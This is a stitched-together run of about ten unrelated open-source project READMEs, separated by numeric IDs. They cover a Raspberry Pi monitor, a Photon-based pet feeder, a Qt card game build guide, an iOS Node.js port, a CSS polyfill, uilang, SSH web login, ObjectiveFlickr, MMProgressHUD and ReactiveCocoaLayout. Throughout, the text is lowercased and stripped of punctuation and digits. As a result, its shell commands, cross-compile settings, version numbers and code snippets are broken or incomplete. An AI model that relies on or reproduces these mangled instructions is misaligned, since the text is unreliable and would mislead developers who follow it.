scratching my own itch i needed a way to remotely run commands though a nice ui and a way to see how my pi is doing when i m not at home for lack of better tooling every thing i evaluated needed a combination of things no other tool gave me all in one this made the resources bloated with gc you get a few megabytes of memory usage to prove to myself that go can be as great for development on the pi as python which many people use there q does it need root a not necessarily since it runs shell commands for you exposed through rest it boils down to whether your commands require root example for these is starting and stopping services q does it work on windows q can you do the same thing with other tools a yes i would opt for collectd with a good set of plugins and which is c based you ll have to make sure there s a plugin for your choice of metrics database then write some kind of web endpoint in python to execute shell commands however as i mentioned before sum up the resources of those and you ll get a bigger consumption there s plenty more to ground control under the hood let s list out a few things ground control will read a file containing a temperature reading to update its own health records this is made so the mechanism is flexible you can use ground control on any machine not just a pi as long as it will expose a temperature reading in a file like device you can add and remove controls commands that your ground control can run by editing or specifying them with your configuration file here s a full description of the format controlname on cmd for on normally a start for a service  off cmd for off normally a stop for a service  status a command that returns the status of the process  once a one time command a cleanup a shutdown etc by convention controlname is snakecase and we turn it into control name on the ui the name should be nice for using in a rest api in this case the commands turn into post controls and controlname and on post controls and controlname and off post controls and controlname and once get controls and controlname and status the on  off  and once commands are async and we return a  ok for success the status command are async and we return a  ok for success and you can easily build an app mobile yourself that makes use of those here s a short guide if you want to experiment with ground control yourself in each case start off by taking a ground control repo clone set up dependencies and build go get github com and jondot and gosigar go build you probably want to build on your own much more powerful system rather than on the pi itself to save time in my case i ll be compiling a go binary on a mac osx x  for a raspberry pi linux armv and  here s how to do it on a mac and brew brew install go devel cross compile all i usually take devel with go drop if you don t if you ve got zshell or a nice alias supporting shell this is a nice alias alias go pi goarch arm goarm  goos linux go and then i just go pi build if you don t want to use an alias then this is the command to cross compile for the pi goarch arm goarm  goos linux go build ground control surrounds around several concepts reporter an entity that takes a health and reports it to somewhere health the entity that s responsible to gather all of the important health metrics control a switchboard like entity that runs commands on request they are sorted by the level of fun and hackability you can get from it but ymmv reporters however it only supports integers out of the box at the worst case go metrics itself can be implemented as a reporter in fact it will be an aggregate reporter of reporters fork implement add tests pull request get my everlasting thanks and a respectable place here

45581111, is a diy cat or dog or human feeder controlled over the web though not over the public internet for now there are two different feeding methods instant feeding with the click of a button or scheduled feedings using a command scheduler like cron the idea behind the project came about because over the past few years all of the feeders i ve came across have had a level of complication that weren t very user friendly to new coders and i wanted to make something that is easy enough for everyone to use let s get started robokitty logo robokitty logo jpg and part and where to buy and price and and and and and xaa batteries and buy these wherever   and additional needs soldering iron wire strippers heat shrink tube robokitty tested tested approved png once you have all of your materials handy you re ready to start make sure you ve already set up an account and logged in on the particle website before starting the tutorial first thing you need to do is power up the photon plug in the cable and connect it to your computer once you ve gotten node installed the next step differs depending on if you re using mac os or windows if you are on a mac there are no additional steps to take before our next one it s time to install the particle cli command line interface open up your cli of choice and type npm install g particle cli this command may require sudo access once it is done downloading type particle cloud login and answer the prompts with the login information you created earlier for the particle site if you have already claimed your photon correctly you re going to need your photon id type the following and keep track of what the number is because you ll need it shortly particle serial identify save that file locally and navigate to the directory in the command line next thing you need to do is flash the firmware if you are connected to your photon you should be ready type the following particle cloud flash particledeviceid voodoospark cpp now you re ready to start working with the code for the feeder clone this repo into your directory of choice by typing the following git clone git github com rachelnicole and robokitty git navigate into the new robokitty folder you re going to have to install your dependencies npm install this will pull down all of the dependencies you need to configure the photon device id token you can either set it when you start the feeder with the following particlekey yourparticlekey photonid yourphotonid npm start or you can follow through with the rest of this section the next step is to update the config js file with your photon s token and device id the device id is the same one that you had used in the previous firmware step add that in the deviceid object on the line for device make the device string no longer empty click on the settings link on the left and copy the access token and add it to the appropriate line in your config js file it will be the in the token object that asks for device with an empty string add it in so the string is no longer empty before we can actually run the code we need to set up the hardware part detach the photon from your computer if it s still attached we ll connect it to an external power supply now all you need is to plug the photon cord into an a and c plug with a udb port the same kind that you plug your iphone into to charge next wire up your photon according to this diagram robokitty wiring diagram robokittywiring png the xaa battery pack wires need to be soldered to two of the mtom wires that plug into the left rails of the breadboard cut off an end of each of the wires and solder the battery pack onto it now you need to connect your servo to the dispenser handle do this the best way you see fit even duct tape will work or you can glue your servo horn to the handle making sure you keep them parallel to each other so it doesn t break experiment with it to find the best way i built a chassis for the servo out of cardboard and duct tape to support the servo while it s turning you don t have to do the same do whatever you d like acrylic cardboard or something else i haven t thought of i also added a chute to the bottom of the feeder dispenser area that i used a cut up plastic bottle for because the distance between the mouth of the dispenser and the base was too close moving it out further in front allows the cats to access it a lot easier once you re all wired up you re ready to run the code if you bought the same servo as me you may have some tweaking to do which we will talk about in the next step in the command line navigate into the main robokitty repository folder type the following npm start you have two options a button and a dropdown the button is for instantaneous feeding while the dropdown is for interval feeding for the alpha release the dropdown is only going to work while the browser is open to that page i have added some feature requests to implement a better way of storing the session variables so even if you lose connection with your photon it will remember push the button robokitty gif robokitty in action gif

using qt s graphics view framework as the game engine i ve tried many other open source game engines such as sdl hge clanlib and others but many of them lack some important features although qt is an application framework instead of a game engine its graphics view framework is suitable for my game developing by moligaloo   framework open source with qt graphics view framework use fmod as sound engine use freetype in font rendering use lua as ai and extension script  operation experience full package include all yoka extension package keyboard shortcut double click to use cards cards sorting by card type and card suit multilayer display when cards are more than an upperlimit  extensible some mods are available based on this game lua packages are supported in this game how to build  tips stands for the folder where the repo is in vs windows  download the following packages  open qsanguosha sln right under and builds and vs change the configuration to release qt and win  right click project qsanguosha in your solution explorer select properties  go to debugging tab set working directory to projectdir do not enter the quote marks then select ok   optional right click sanguosha ts in the folder translaton files in project qsanguosha  select lrelease  you are now able to build the solution when compilation succeeded the qsanguosha exe is in and bin folder you should move this file to folder  copy  files from qt libraries to  they are listed below qtcore dll qtgui dll qtnetwork dll qtqml dll qtquick dll qtwidgets dll copy  files from vs redist to  they are listed below msvcp dll msvcr dll  double click the qsanguosha exe and have fun   install xcode from app store and enable the command tool tips unzip the source code tarball and open a terminal type and configure without pcre sudo make install  open a terminal here type cd swig swig c and and lua sanguosha i  open qsanguosha pro with qt creator configure the project and make sure the project is compiled with clang change the configuration to release  you are now able to build the solution when compilation succeeded the qsanguosha app folder is in and and build qsanguosha and folder i highly recommend you move this folder to  this step is the most important and difficult one please pay a lot of attention to read this step open a terminal here type otool l qsanguosha app and contents and macos and

7648146, neu node is an implementation of node js compatible api for ios devices which allows the application developer to embed variety of micro servers http server chat server proxy server game server etc in their ios applications with neu node ios devices are no longer just client devices they become network nodes  which actively participate in providing distributed computing services and enriching the user experience neu node enables new breeds of applications such as server less multi player games ad hoc and local social networking applications peer to peer sharing co producing and collaborations real time media transport such as security camera html apps with embedded proxy server for better caching and off line support neu node is not a straight port of node js to ios ios has too many restrictions to run node js as is ios does not allow applications to execute dynamically generated code essentially prohibiting v s just in time compilation ios does not allow applications to access low level system resources such as file systems and processes which node js takes advantage of in addition the performance characteristic of mobile devices is very different from servers where the original node js was designed for we need to pay a lot more attention to the power consumption and memory usage on mobile devices and some techniques used in node js such as thread pooling and in memory cache are not appropriate for mobile devices the primary goal of this project is offering a node js compatible development environment for developers to run lightweight servers on ios devices while it is quite important to be node js compatible it does not have to be comprehensive neu node offers a subset of node js api which are essential to implement embedded servers neu node consists of libnode core which are implemented in objective c and a set of standard javascript libraries it uses uiwebview as the javascript runtime instead of v it has a custom javascript and objective c js and oc bridge to call objective c code from javascript and fire asynchronous events from objective c to javascript in order to debug your neu node application written in javascript  you need to  run your app under xcode  attach safari s web inspector to your app by choosing develop device name app name you need to enable web inspector of your iphone and ipad by choosing safari advanced in the settings application global js is the key javascript library that implements the js and oc bridge require method as well as built in globals such as console and process assert js events js freelist js punycode js querystring js and stream js are directly brought from node js since they don t rely on any c and and code dns js fs js net js http js are neu node specific implementations of equivalent modules in node js static js and mime js are standard extensions which offer the equivalent functionality to node static a popular module for static http server it uses memory mapped files to efficiently serve large files over http to require modules unlike regular node js all required modules must be explicitly loaded in the loader file the contents of loader html a loader file html header and header body and body and html the contents of server js var http require http var server http createserver handler function handler request response  the name of the directory that the currently executing script resides in under neu node the actual value of dirname is always empty string which indicates the root folder of the main bundle the contents of server js var fs require fs fs readfile dirname and and myapp and templates html  utf  function err str  in neu node the readfile function above accesses the templates html file in and root and myapp and folder in the main bundle in order to access module module exports and exports each module file needs to be surrounded by following code function var module require register modulename var exports module exports  and and definition of the module   if the module will be used for both neu node and node js it needs to be surrounded by following code instead function module var module module and and require register modulename var exports module exports  and and definition of the module  typeof module undefined module null in neu node this function returns ios in neu node this function is equivalent to settimeout callback  in neu node this function prints the output to the xcode console creates a tcp socket connection to the host port specified by options the connectlistner parameter will be added as a listener for the connect event options host specifies the hostname or ip address options port specifies the port number just like node js this object is an abstraction of a tcp socket which implements a duplex stream interface creates a new tcp server the connectionlistner argument is automatically set as a listener for the connection event this class is used to create a tcp or unix server a server is a net socket that can listen for new incoming connections a collection of all the standard http response status codes and the short description of each returns a new web server object the requestlistener is a function which is automatically added to the request event options can be an object or a string if options is a string it is automatically parsed with url parse host a domain name or ip address of the server to issue the request to defaults to localhost port port of remote server defaults to  method a string specifying the http request method defaults to get headers an object containing request headers path request path defaults to and should include query string if any e g and index html page  asynchronously reads the entire contents of a file encoding must be utf if the filename start with and doc and  it will access the file in the document directory if the filename start with and prv and  it will access the file in the library directory otherwise it will access the file in the root directory of the main bundle asynchronously writes data to a file replacing the file if it already exists data must be a string not buffer unlike node js it always write the file into the working directory the app folder of the library directory resolves a domain e g google com into an array of ipv addresses the callback has arguments err addresses libnode core is a static library implemented in objective c

5285733,  no fluff here the polyfill will test any browser for rem support and patch it up if needed although we all know ie and below is where the issue lies once lack of support is determined it reads all the link tags for stylesheets and finds selectors that have rules using the rem unit it then recalculates those rules to px and writes them in the head to override in the cascade magic it has been tested on a large production publishing site and works great with minor performance differences we re always open to suggestions and and or improvements so please fork getting started  in some cases you may want the polyfill to skip some stylesheets if that s you then just add data norem as an attribute to the link tags of the stylesheets to be ignored there are a few reasons you may want to do this if you are loading a crazy long stylesheet that you know doesn t use rem units then having the polyfill skip it will give your page a moderate speed boost and will help avoid a flash of unstyled content and if your page loads css from another domain that doesn t have cors enabled then you should tell the polyfill to ignore that css since it will not be able to load the stylesheet this repo includes a small example so you can bring up the polyfill in your browser to see how it works install using bower  bower install rem unit polyfill
23365000, uilang is a dead simple programming language for web designers with uilang you write your code just like plain english straight into your html using a code element uilang s logic relies on manipulating classes on html elements and using these classes in css to show hide animate and transform elements when a click occurs this simple logic lets designers create most of the typical user interface behaviours tabs popovers overlays sliding menus etc you re now ready to write some uilang your code should be inserted in a code element preferably at the very end of your page just before and body the syntax looks like this clicking on hide adds class hidden on div this is pretty much the only syntax you ll have to learn this code is straightforward when you click on an element with a hide class a hidden class will be added to every div now this hidden class can be used in your css to actually hide these div s with for example a simple fade out effect transition opacity s div hidden opacity  let s deconstruct the syntax from our previous example clicking on hide  adds  class hidden  on div   any css selector  adds  removes or toggles  any class name  any css selector or the target keyword which selects the clicked element you can add as many instructions as you want into your code element clicking on hide adds class hidden on div clicking on nav tabs adds class active on target clicking on img first child toggles class big on target don t worry about having other code elements on your page uilang will only execute the one containing your uilang code please note that uilang only supports click events hover effects can usually be achieved in css and other events are simply out of the scope of this language by keeping its feature set light and focused uilang aims to lower the barriers to entry into programming keep in mind uilang is basically just html which means that you re already familiar with the syntax for comments clicking on hide adds class hidden on div clicking on nav tabs adds class active on target

46407285, this is a simple experiment to authenticate web sessions with ssh doing so gives you a fully decentralized passwordless authentication for free a custom ssh server listens for connections instead of providing a shell or any other service it only validates the public key you offer then a callback is made to a web application with a payload containing the validated public key along with the login token used in practise you would have first hit a login with ssh button on the web app it would have generated a session that resolves into a valid one with a callback handing the proper key and token combination anyway have fun

174922, objectiveflickr  objectiveflickr is a flickr api framework designed for mac and iphone apps oauth support  objectiveflickr now supports flickr s new oauth based authentication process i ll post more about it in the coming week the snapandrun sample is updated to reflect the usage a new mac sample oauthtransitionmac demonstrates how to use the new oauth based api and also how to migrate your existing auth tokens oauthtransitionmac uses arc and therefore also shows how to use objectiveflickr which is a non arc library with an arc app ios support in objectiveflickr was developed mostly during the iphone os   days and it shows more update work will be required to reflect the changes in the ios development process your contribution like updating this readme submitting new samples or test cases is greatly welcome and it will benefit the ios open source development community too for the steps you need to take for the transition what s new in    version   is a complete rewrite with design integrity and extensibility in mind differences from   x include the framework now builds with all major apple sdks mac os x     iphone os   x and other beta version platforms to which i have access it also builds on both  bit and  bit platforms ordinary request and upload request are now unified into one offlickrapirequest class   no longer depends on nsxmldocument which is not available in iphone sdk it now maps flickr s xml response into an nsdictionary using only nsxmlparser which is available on all apple platforms image uploading employs temp file this allows objectiveflickr to operate in memory constrained settings error reporting now uses nserror to provide more comprehensive information especially error code and message from flickr if you already use objectiveflickr   x the bad news is that   is not backward compatible the good news though is that it uses a different set of class names some migration tips are offered near the end of this document what s not yet there  there are of course quite a few to do s in source api documentation unit testings flickr api coverage tests challenging though how do you test a moving target objectiveflickr   x has a few convenient methods and tricks to simplify method calling they are not ported here yet or will never be quick start example apps you can use  that make use of the tool to manage objectiveflickr for you  check out the code from github bash git clone git and and github com and lukhnos and objectiveflickr git  supply your own api key and shared secret you need to copy sampleapikey h template to sampleapikey h  and fill in the two macros there if you don t have an api key apply for yours at make sure you have understood their terms and conditions  remember to make your api key a web app  and set the callback url not the application url to snapnrun and and auth  build and run snapandrun for iphone the project is located at examples and snapandrun iphone  build and run randompublicphoto for mac the project is at examples and randompublicphoto adding objectiveflickr to your project  update    this section shows its age and needs updating pull requests on an up to date instruction will be appreciated meanwhile if you use project by adding this one line to you podfile pod objectiveflickr then just run pod install and start using objectiveflickr adding objectiveflickr to your mac app project   add objectiveflickr xcodeproj to your mac project from xcode menu project add to project  on your app target open the info window using get info on the target  then in the general tab add objectiveflickr framework to direct dependencies  add a new copy files phase and choose framework for the destination in its own info window  drag objecitveflickr framework from the groups files panel in xcode under the added objectiveflickr xcodeproj to the newly created copy files phase  drag objecitveflickr framework once again to the target s linked binary with libraries group  open the info window of your target again set configuration to all configurations  then in the framework search paths property add targetbuilddir and frameworksfolderpath  use import objectiveflickr and objectiveflickr h in your project adding objectiveflickr to your iphone app project  because iphone sdk does not allow dynamically linked frameworks and bundles we need to link against objectiveflickr statically  add objectiveflickr xcodeproj to your mac project from xcode menu project add to project  on your app target open the info window using get info on the target  then in the general tab add objectiveflickr library to direct dependencies  also in the same window add cfnetwork framework to linked libraries  drag libobjecitveflickr a to the target s linked binary with libraries group  open the info window of your target again set configuration to all configurations  then in the header search paths property add these two paths separately of root is where you checked out objectiveflickr of root and source of root and lfwebapikit  use import objectiveflickr h in your project key ideas and basic usage  objectiveflickr is an asynchronous api because of the nature of gui app all objectiveflickr requests are asynchronous you make a request then objectiveflickr calls back your delegate methods and tell you if a request succeeds or fails objectiveflickr is a minimalist framework the framework has essentially only two classes you have to deal with offlickrapicontext and offlickrapirequest unlike many other flickr api libraries objectiveflickr does not have classes like flickrphoto flickruser flickrgroup or whathaveyou you call a flickr method like flickr photos getinfo  and get back a dictionary hash or map in other languages containing the key value pairs of the result the result is directly mapped from flickr s own xml formatted response because they are already structured data  objectiveflickr does not translate further into other object classes because of the minimalist design you also need to have basic understanding of the details but basically all you need to know is the methods you want to call and which xml data the key values flickr will return typically to develop a flickr app for mac or iphone you need to follow the following steps  create an offlickrapicontext object obj c offlickrapicontext context offlickrapicontext alloc initwithapikey yourkey sharedsecret yoursharedsecret  create an offlickrapirequest object where appropriate and set the delegate obj c offlickrapirequest request offlickrapirequest alloc initwithapicontext context and and set the delegate here we assume it s the controller that s creating the request object request setdelegate self  implement the delegate methods obj c void flickrapirequest offlickrapirequest inrequest didcompletewithresponse nsdictionary inresponsedictionary void flickrapirequest offlickrapirequest inrequest didfailwitherror nserror inerror void flickrapirequest offlickrapirequest inrequest imageuploadsentbytes nsuinteger insentbytes totalbytes nsuinteger intotalbytes all three methods are optional informal protocol in old objective c speak optional protocol methods in newspeak nota bene if you are using mac os x   sdk or if you are using   sdk but targeting   then the delegate methods are declared as informal protocols in all other cases os x   and above or iphone apps  you need to specify you are adopting the offlickrapirequestdelegate protocol e g obj c interface myviewcontroller uiviewcontroller offlickrapirequestdelegate  call the flickr api methods you want to use here are a few examples calling flickr photos getrecent with the argument perpage  obj c request callapimethodwithget flickr photos getrecent arguments nsdictionary dictionarywithobjectsandkeys   perpage  nil quite a few flickr methods require that you call with http post because those methods write or modify user data obj c request callapimethodwithpost flickr photos setmeta arguments nsdictionary dictionarywithobjectsandkeys photoid photoid  newtitle title  newdescription description  nil  handle the response or error in the delegate methods if an error occurs an nserror object is passed to the error handling delegate method if the error object s domain is offlickrapireturnederrordomain  then it s a server side error you can refer to flickr s api documentation for the meaning of the error if the domain is offlickrapirequesterrordomain  it s client side error usually caused by lost network connection or transfer timeout we will now talk about the response how to upload a picture  to upload a picture create an nsinputstream object from a file path or the image data nsdata  then make the request here in the example we assume we already have obtained the image data in jpeg and we set make private the uploaded picture nsinputstream imagestream nsinputstream inputstreamwithdata imagedata request uploadimagestream imagestream suggestedfilename foobar jpg mimetype image and jpeg arguments nsdictionary dictionarywithobjectsandkeys   ispublic  nil upload progress will be reported to the delegate method flickrapirequest imageuploadsentbytes totalbytes the reason why objectiveflickr asks for an nsinputstream object as input is that we don t want to read in the whole image into memory for the preparation of upload data with nsinputstream you have the flexibility of feeding objectiveflickr an in memory image data a file or even a virtualized image byte stream that comes from different e g partitioned make sure you have read flickr s upload api documentation how to pick up the upload result please note that between the completion of uploading and the completion of the http post request itself the moment at which you receive the response  there can be a long wait so make sure you have a long timeout interval especially when you upload a large image and also design your ui accordingly auth considerations  deprecated the original authentication process is now deprecated by flickr for the steps you need to take for the new setup if your app does not just read public photos your app will need to get user permission for accessing their photos you need to use flickr s authentication and authorization mechanism hereafter auth to cover both steps to get the authtoken for your later access this is frankly the most difficult part in using the whole flickr api anything that comes after that is easy and usually smooth that alone is worth a whole tutorial but i ll try to explain the essentials before that get to know flickr s own doc here there are two types of app auth there is actually a mobile app auth designed for feature phones or smart phones that aren t well not really smart if you buy what apple says but since we are talking about mac and iphone apps and they aren t any ye olde mobile platform we ll skip that one and go straight into the two major types of app auth desktop app auth the old way deprecated  deprecated the original authentication process is now deprecated by flickr for the steps you need to take for the new setup before mac developers were only interested in desktop app auth if you have used any mac flickr app before flickrexport houdahgeo posterino and many others  you know how it works  open the app  the app presents a dialog box telling you it s going to open the web browser you log into flickr flickr asks you if you grant permission to the app currently asking for your permission read write or delete access  after you grant the permission you switch back to the app hit some continue button on the app the dialog box  the app fetches the auth token from flickr and completes the process to map that into your app s internal workings you need to do these  call flickr auth getfrob  after you receive the frob pass the whole inresponsedictionary to offlickrapicontext loginurlfromfrobdictionary requestedpermission and get the returned nsurl object  tell user that you re going to open the browser for them prompt for action  open the browser with the url you just got then wait  after user completes the auth she will click on the continue button or something like that  your app then calls flickr auth gettoken the auth token  assign the auth token to your current flickr api context with offlickrapicontext setauthtoken  that s it objectiveflickr will add the authtoken argument to all your subsequent api calls and you now have the access to all the apis to which the user has grant you permission iphone app auth and the new way deprecated  deprecated the original authentication process is now deprecated by flickr for the steps you need to take for the new setup iphone and ipod touch posed a challenge to the auth model above opening up mobile safari then ask the forgetful user to come back is a bad idea so many iphone developers have come up with this brilliant idea use url scheme to launch your app it turns out that flickr s web app auth serves the idea well here is how it works  the app prompts user that it s going to open up browser to ask for permission  the user taps some open button and the app closes mobile safari pops up with flickr s login and then app auth page  then magically mobile safari closes and the app is launched again  there s no step  what s behind the scene is that the iphone app in question has registered a url scheme for example someapp and and in its info plist and the app developer has configured their flickr api key so that when the user grants the app permission flickr will redirect the web page to that url the app developer has previously designated mobile safari opens that url and then the app is launched in fact mac app can do that too here s what you need to do  register the url scheme take a look at my own snapandrun iphone example app s snapandrun info plist and this cocoadev article  configure your flickr api key so that the callback url is set to that url scheme  get a login url by calling offlickrapicontext loginurlfromfrobdictionary requestedpermission  note that you don t need to have a frob dictionary for getting web app login auth url so just pass nil you still need to pass the permission argument of course  now in your app launch url handler mac and iphone apps do it differently see apple doc for details  get the frob that flickr has passed to you with the url  your app then calls flickr auth gettoken the auth token  assign the auth token to your current flickr api context with offlickrapicontext setauthtoken  that s it objectiveflickr will add the authtoken argument to all your subsequent api calls and you know have the access to all the apis to which the user has grant you permission now you have done the most difficult part of using the flickr api how flickr s xml responses are mapped back  flickr s default response format is xml you can opt for json whichever format you choose the gist is that they are already structured data when i first started designing objectiveflickr i found it unnecessary to create another layer of code that maps those data to and from native objects so we don t have things like offlickrphoto or offlickrgroup in essence when an request object receives a response it maps the xml into a data structure consisting of nsdictionary s nsarray s and nsstring s in apple speak this is known as property list and we ll use that term to describe the mapped result you then read out in the property list the key value pairs you re interested in objectiveflickr uses the xml format to minimize dependency it parses the xml with nsxmlparser which is available on all apple platforms it maps xml to property list following the three simple rules  all xml tag properties are mapped to nsdictionary key value pairs containing the key ofxmltextcontentkey a string const with its value being the text content  objectiveflickr knows when to translate arrays we ll see how this is done now so for example this is a sample response from flickr auth checktoken xml version   encoding utf  rsp stat ok token aaaabbbb  and token then in your flickrapirequest didcompletewithresponse delegate method if you dump the received response an nsdictionary object with nslog you ll see something like extraneous parts omitted auth perms text write token text aaaabbbb  user fullname blah nsid  n username foobar  stat ok so say if we are interested in the retrieved auth token we can do this nsstring authtoken inresponsedictionary valueforkeypath auth token textcontent here our own nsdictionary textcontent is simply a convenient method that is equivalent to calling authtoken objectforkey ofxmltextcontentkey in our example here is another example returned by flickr photos getrecent xml version   encoding utf  rsp stat ok and photos and the mapped property list looks like photos page  pages  perpage  photo  farm  id  isfamily  isfriend  ispublic  owner  n secret bbc server  title studio   farm  id  and and   farm  id  and and   total  stat ok in the array you can do this nsdictionary photodict inresponsedictionary valueforkeypath photos photo objectatindex  then with two helper methods from offlickrapicontext  you can get the static photo source url and the photo s original web page url nsurl staticphotourl flickrcontext photosourceurlfromdictionary photodict size offlickrsmallsize nsurl photosourcepage flickrcontext photowebpageurlfromdictionary photodict do remember that flickr requires you present a link to the photo s web page wherever you show the photo in your app so design your ui accordingly wacky xml mappings  unfortunately there are some flickr responses that don t rigorously follow the plural tag array rule consider the following snippet tag attributes removed to highlight the issue at hand  from the api method flickr activity userphotos rsp stat ok items page  pages  perpage  total  item type photo title snap and run demo and title event type comment double comment  and event event type comment double comment  and event and activity item type photo title snap and run demo and title event type comment test comment  and event and activity event tags this is actually a gray area of flickr api and i m not entirely sure if i should write that exception into the book i e the logic of ofxmlmapper  which handles the job the list of exceptions could never be comprehensive we can make good use of objective c s dynamic nature to work around the problem we can tell if it s an array and and get the first element in the items nsarray itemarray responsedict valueforkeypath items item nsdictionary firstitem itemarray objectatindex  and and get the event element and see if it s an array id event firstitem valueforkeypath activity event if event iskindofclass nsarray class and and it has more than one elements nsdictionary someevent event objectatindex  and and that s the only element nsdictionary someevent event on the other hand the reason why we build the plural tag rule in ofxmlmapper is that writing the boilerplate above for frequently used tags again and again is very tedious since ofxmlmapper already handles the plural tags the borderline cases are easier to tackle design patterns and tidbits  design your own trampolines  offlickrapirequest has a sessioninfo property that you can use to provide state information of your app however it will soon become tedious to write tons of if else s in the delegate methods my experience is that i design a customized session object with three properties delegate that doesn t have to be the originator of the request  selector to call on completion selector to call on error then the delegate methods for offlickrapirequest simply dispatches the callbacks according to the session object if your controller calls a number of flickr methods or involves multiple stages and states this design pattern will be helpful thread safety  each offlickrapirequest object can be used in the thread on which it is created do not pass them across threads delegate methods are also called in the thread in which the request object is running cfnetwork based  objectiveflickr uses lfhttprequest which uses only the cfnetwork stack nsurlconnection is reported to have its own headaches on the other hand lfhttprequest does not handle non http urls it does handle https with a catch on iphone you cannot use untrusted root certs and does not do http authentication it also does not manage caching for web api integration however lfhttprequest provides a lean way of making and managing requests one side note lfhttprequest will use your system s shared proxy settings on your mac or iphone this is how it requires systemconfiguration framework on mac when being built alone possible migration path from objectiveflickr   x  i didn t really seriously investigate this but here are some thoughts in theory   x and   should co exist as there is no class name clashes offlickrcontext becomes offlickrapicontext offlickrinvocation becomes offlickrapirequest offlickruploader is now merged into offlickrapirequest delegate methods are greatly simplified and redesigned objectiveflickr was first released in late  the previous version   x has undergone one rewrite and is hosted on google the present rewrite derives from the experiences that i have had in developing mac and iphone products i run my own company lithoglyph lithoglyph com it s a great learning process acknowledgements  many people have given kind suggestions and directions to the development of objectiveflickr and there are a number of mac apps that use it i d like to thank mathieu tozer tristan o tierney christoph priebe yung lun lan and pierre bernard for the feedbacks that eventually lead to the framework s present design and shape

10766496, mmprogresshud  an easy to use hud interface with personality it would be a shame for mutual mobile s in house hud interface to not be shared with the world now available for everyone mmprogresshud is a part of mutual mobile s growing suite of open source objective c projects use the shared instance of mmprogresshud through either the and sharedhud class method or through the other suite of class convenience methods available usage of mmprogresshud can be accomplished in a single line of code objc mmprogresshud showwithtitle loading status  dismissing can be done in a number of ways and is just as simple objc and do some work asynchronously and void completion void mmprogresshud dismisswithsuccess completed no parent views to specify nothing else to think about customizations on the look and feel of mmprogresshud are optional and can be performed once during the lifetime of your application these are shown below in the setup setup section use cocoapods for installation pod mmprogresshud if you really insist on doing things the hard way simply include all of the files in the source and folder in the repository in your project if you don t already have it in your project you ll need to link against the quartzcore and coregraphics frameworks the primary motivation for building mmprogresshud was to be able to easily add fun animations as they were needed mmprogresshud has several presentation and dismiss animation styles depending on what you are looking for  drop when presented the hud drops from above the screen and hangs as if it were pinned on it s top corners to the top corners of the screen with string the initial angle and constants for the keyframe animation are random so no two presentations look exactly the same on dismissal hud falls as if both strings had been cut  expand presentation begins with the hud very small scaling larger to the final size with a small bounce dismissal begins with a small bounce around the original size up to a very large size  shrink presentation begins with the hud much larger than reality scaling smaller to the final size with a small bounce dismissal shrinks from the hud s original size down to a small point with an alpha fade and a small initial bounce  balloon presentation begins below the screen with the hud floating up from the bottom as if it were a balloon being let go into the air and hanging at the end of its string dismissal acts as if the string holding the balloon were cut and the hud floats off the top of the screen  fade your standard alpha fade in and out use and void setpresentationstyle mmprogresshudpresentationstyle presentationstyle to modify the presentation animation mmprogresshud uses coregraphics drawn images for the default images this makes it very easy to drop in all the files to your project without having to specify bundles and other assets to copy just include the source and you re good to go mmprogresshud is window based so it will display the overlay above the status bar this means that mmprogresshud does not muck with your view hierarchies and will stay self contained in its own window mmprogresshud does not make itself the key window at any point during presentation mmprogresshud supports almost arbitrary text content as a matter of design and clutter you probably shouldn t put too much text into a hud but mmprogresshud will intelligently lay itself out depending on your text content changing the text and image content while the hud is displayed will initiate an animation between the two states this animation is very fast yet not instantaneous in order to provide context of the state change mmprogresshud supports extremely basic user input in the form of a confirmation tap from the user to initiate a cancellation action after the user taps the hud it will enter a confirmation state in which the hud changes state to let the user know the next tap will initiate some action that you define see completion blocks below for example use this to let the user cancel a long running task the confirmation state resets back to the normal hud state after a given timeout if the user has not confirmed the action mmprogresshud looks for a cancelblock when determining whether or not to enter into the confirmation state lang objective c and void showwithtitle nsstring title status nsstring status confirmationmessage nsstring confirmation cancelblock void void cancelblock some hud actions can have an associated block of work attached to them to be fired when the action occurs  dismissanimationcompletion a block of work that is executed when the hud dismissal animation is completed  cancelblock a block of work that is executed when the user cancels a long running action when this block is non nil the hud will respond to taps and enter a confirmation state on first tap when a confirmation tap is performed by the user the hud is dismissed and this block is fired  progresscompletion a block of work that is executed when the hud s progress property is fed a value  f by default mmprogresshud displays an indeterminate spinner but it also supports determinate tasks through the progress apis feed mmprogresshud a progress   and it will display a progress indicator visually displaying the task progress to the user currently both radial and linear progress indicators are provided with an api to provide an arbitrary determinate progress class that conforms to mmprogressview lang objective c and void showprogresswithstyle mmprogresshudprogressstyle

void updateprogress cgfloat progress withstatus nsstring status title nsstring title and void updateprogress cgfloat progress withstatus nsstring status and void updateprogress cgfloat progress when setting up your instance of mmprogresshud you ll need to configure the settings according to the style and behavior you re trying to achieve you can find the available properties in mmprogresshud h these settings will persist across calls of show and dismiss  so you only have to set them once per instance  overlaymode the type of overlay that displays behind the hud and over your content  successimage the success image you would like to use for success dismissal the default image is a white check mark  errorimage the error image you would like to use for error situations the default

mmprogresshud consists of a window an overlay view and the hud view itself since mmprogresshud is window based the overlay will display full screen over the status bar the only two pieces of information related to mmprogresshud s visual anatomy are the text labels mmprogresshudwindow uiwindow mmprogresshudoverlayview uiview mmhud uiview titlelabel uilabel contentcontainer uiview

using the class convenience methods when contributing your modifications back to the rest of the community please keep a couple of things in mind  keep changes as concise as possible  please hesitate when adding new methods to the public header  don t remove methods from the public header provide backward compatibility and deprecation attributes for methods that are deprecated  please exclude modifications that include a large amount of whitespace changes they are very difficult to diff  we want your changes work with us to help you get them in so that everyone can benefit from your work

7126663, reactivecocoalayout is a framework for describing cocoa and cocoa touch layouts in a reactive way based on this framework is very much a work in progress at the moment and should be considered alpha quality breaking changes may happen often during this rcl intends to offer the following advantages over auto layout explicit and linear layout reactive layout proceeds in a linear fashion making it easier to understand and debug the steps it takes along the way top down layout a view s layout doesn t interact with its superview s layout unless the former s size or frame is explicitly incorporated in the latter s layout chain creating a unidirectional relationship that leads to better encapsulation no global priorities and less complexity bidirectional relationships are still possible but must be made explicit conditional layouts at runtime rcl is built on the full power be composed to dynamically disable and re enable entire layout chains like when you want to hide and show views without actually modifying them implicit animations to animate the setting of a view s frame simply add an animation method into the signal chain no need to explicitly animate constants anywhere incremental use rcl can be used internally in views without any implementation details leaking out callers using auto layout or struts and springs can incorporate reactive views without knowing or caring how they perform layout internally no ui wide slowdowns or behavior changes just from using rcl extensibility rcl is made up of many independent bits of functionality unified into a framework it s easy to extend it with your own functionality if you want it to behave differently not a black box unlike appkit and uikit rcl is an open source project so you can crack open any particular bit and see why it behaves the way it to start building the framework clone this repository and then run script and bootstrap this will automatically pull down any dependencies then simply open reactivecocoalayout xcworkspace note not the xcodeproj 